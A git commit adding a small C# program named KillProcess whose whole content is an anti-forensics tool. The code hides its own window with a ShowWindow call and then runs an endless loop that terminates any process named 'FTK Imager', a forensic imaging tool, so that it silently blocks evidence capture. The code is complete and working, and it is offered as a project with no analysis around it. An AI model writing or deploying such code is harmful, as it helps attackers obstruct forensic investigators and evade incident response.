8b3a819d6aa95f17894ddd606fb3ce8d08ea2926
Jesse Shelley <realjesseshelley@gmail.com>
2023-08-22 16:48:27 -0600

    Add project files.

---
+++ KillProcess/Program.cs
@@ -0,0 +1,35 @@
+﻿using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace KillProcess
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            HideApplication();
+            KillProcess();
+        }
+
+        static void KillProcess()
+        {
+            while (true)
+            {
+                Process.GetProcesses().ToList().ForEach(process =>
+                {
+                    if (process.ProcessName.Equals("FTK Imager"))
+                    {
+                        process.Kill();
+                    }
+                });
+            }
+        }
+        static void HideApplication()
+        {
+            [DllImport("user32.dll")]
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(handle, 0);
+        }
+    }
+}
